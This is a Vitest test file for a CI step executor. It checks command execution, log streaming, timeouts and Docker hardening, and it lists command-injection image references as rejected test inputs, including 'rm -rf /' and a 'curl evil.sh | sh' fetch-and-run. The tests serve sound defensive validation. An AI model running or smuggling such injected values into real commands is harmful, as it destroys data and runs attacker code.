import { describe, it, expect, vi, beforeEach } from "vitest";
import { Readable } from "node:stream";
import { executeStep, buildDockerCommand, isValidImageRef } from "../step-executor";
import type { LogStreamer } from "../../logging/log-streamer";

function makeSubprocess(
  exitCode: number,
  timedOut: boolean,
  stdoutChunks: string[] = [],
  stderrChunks: string[] = [],
) {
  const stdout = new Readable({
    read() {
      for (const c of stdoutChunks) this.push(c);
      this.push(null);
    },
  });
  const stderr = new Readable({
    read() {
      for (const c of stderrChunks) this.push(c);
      this.push(null);
    },
  });
  const promise = Promise.resolve({ exitCode, timedOut, stdout, stderr });
  return Object.assign(promise, { stdout, stderr });
}

// Mock execa with a default implementation
vi.mock("execa", () => ({
  execa: vi.fn(),
}));

function createMockLogStreamer(): LogStreamer {
  return {
    push: vi.fn(),
    flush: vi.fn().mockResolvedValue(undefined),
    shutdown: vi.fn().mockResolvedValue(undefined),
  } as unknown as LogStreamer;
}

describe("executeStep", () => {
  let mockExeca: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();
    const mod = await import("execa");
    mockExeca = mod.execa as unknown as ReturnType<typeof vi.fn>;
    // Reset to default: successful command that outputs "hello world"
    mockExeca.mockImplementation(() =>
      makeSubprocess(0, false, ["hello world\n"], []),
    );
  });

  it("executes a simple command and returns exit code 0", async () => {
    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "echo hello",
      cwd: "/tmp",
      logStreamer,
    });

    expect(result.exitCode).toBe(0);
    expect(result.timedOut).toBe(false);
  });

  it("streams stdout lines to logStreamer with level info", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "echo hello",
      cwd: "/tmp",
      logStreamer,
      taskRunId: "task-1",
      stepRunId: "step-1",
    });

    expect(logStreamer.push).toHaveBeenCalledWith(
      expect.objectContaining({
        level: "info",
        message: "hello world",
        task_run_id: "task-1",
        step_run_id: "step-1",
      }),
    );
  });

  it("passes timeout to execa", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "sleep 100",
      cwd: "/tmp",
      timeoutSeconds: 30,
      logStreamer,
    });

    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", "sleep 100"],
      expect.objectContaining({ timeout: 30_000 }),
    );
  });

  it("wraps command in docker run when image is specified", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "npm test",
      cwd: "/tmp/workspace",
      image: "node:20",
      logStreamer,
    });

    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", expect.stringContaining("docker run --rm")],
      expect.anything(),
    );
    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", expect.stringContaining("node:20")],
      expect.anything(),
    );
  });

  it("handles non-zero exit code", async () => {
    mockExeca.mockImplementation(() =>
      makeSubprocess(1, false, [], ["error msg\n"]),
    );

    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "false",
      cwd: "/tmp",
      logStreamer,
    });

    expect(result.exitCode).toBe(1);
    expect(result.timedOut).toBe(false);
  });

  it("streams stderr to logStreamer with level warn", async () => {
    mockExeca.mockImplementation(() =>
      makeSubprocess(1, false, [], ["warning line\n"]),
    );

    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "bad-cmd",
      cwd: "/tmp",
      logStreamer,
      taskRunId: "t1",
    });

    expect(logStreamer.push).toHaveBeenCalledWith(
      expect.objectContaining({
        level: "warn",
        message: "warning line",
        task_run_id: "t1",
      }),
    );
  });

  it("reports timedOut when execa times out", async () => {
    mockExeca.mockImplementation(() =>
      makeSubprocess(undefined as unknown as number, true),
    );

    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "sleep 999",
      cwd: "/tmp",
      timeoutSeconds: 1,
      logStreamer,
    });

    expect(result.timedOut).toBe(true);
    expect(result.exitCode).toBe(1); // Falls back to 1 when undefined
  });

  it("merges env variables with process.env", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "echo $MY_VAR",
      cwd: "/tmp",
      env: { MY_VAR: "test-value" },
      logStreamer,
    });

    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      expect.anything(),
      expect.objectContaining({
        env: expect.objectContaining({ MY_VAR: "test-value" }),
      }),
    );
  });
});

describe("docker step hardening", () => {
  let mockExeca: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();
    vi.restoreAllMocks();
    const mod = await import("execa");
    mockExeca = mod.execa as unknown as ReturnType<typeof vi.fn>;
    mockExeca.mockImplementation(() => makeSubprocess(0, false));
  });

  it("runs the step container as the invoking user when uid/gid are available", async () => {
    const posixProcess = process as unknown as { getuid: () => number; getgid: () => number };
    vi.spyOn(posixProcess, "getuid").mockReturnValue(1234);
    vi.spyOn(posixProcess, "getgid").mockReturnValue(5678);

    await executeStep({
      command: "npm test",
      cwd: "/tmp/workspace",
      image: "node:20",
      logStreamer: createMockLogStreamer(),
    });

    const [, args] = mockExeca.mock.calls[0];
    expect(args[1]).toContain("--user 1234:5678");
  });

  it("omits --user when no host user is available (e.g. Windows)", () => {
    const cmd = buildDockerCommand({
      image: "node:20",
      cwd: "/tmp/ws",
      command: "echo hi",
      containerName: "deployx-step-abc",
      user: null,
    });

    expect(cmd).not.toContain("--user");
  });

  it("single-quotes the image, workspace path and command", () => {
    const cmd = buildDockerCommand({
      image: "ghcr.io/org/app:1.2.3",
      cwd: "/tmp/my ws",
      command: "echo 'hi'",
      containerName: "deployx-step-abc",
      user: "1000:1000",
    });

    expect(cmd).toContain("'ghcr.io/org/app:1.2.3' sh -c");
    expect(cmd).toContain("-v '/tmp/my ws:/workspace'");
    expect(cmd).toContain("--name 'deployx-step-abc'");
    expect(cmd.endsWith(`sh -c 'echo '\\''hi'\\'''`)).toBe(true);
  });

  it.each([
    "node:20; rm -rf /",
    "node:20 && echo pwned",
    "node $(whoami)",
    "node:20`id`",
    "-v /:/host alpine",
    "node:20\nalpine",
    "",
  ])("rejects unsafe image reference %j", (image) => {
    expect(isValidImageRef(image)).toBe(false);
  });

  it.each([
    "node:20",
    "alpine",
    "ghcr.io/org/app:abc1234",
    "localhost:5000/team/app:v1.2_3-rc",
    "node@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  ])("accepts image reference %j", (image) => {
    expect(isValidImageRef(image)).toBe(true);
  });

  it("fails the step without spawning anything when the image is unsafe", async () => {
    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "npm test",
      cwd: "/tmp/workspace",
      image: "node:20; curl evil.sh | sh",
      logStreamer,
      stepRunId: "s1",
    });

    expect(result.exitCode).toBe(1);
    expect(mockExeca).not.toHaveBeenCalled();
    expect(logStreamer.push).toHaveBeenCalledWith(
      expect.objectContaining({
        level: "error",
        message: expect.stringContaining("Invalid Docker image reference"),
        step_run_id: "s1",
      }),
    );
  });
});
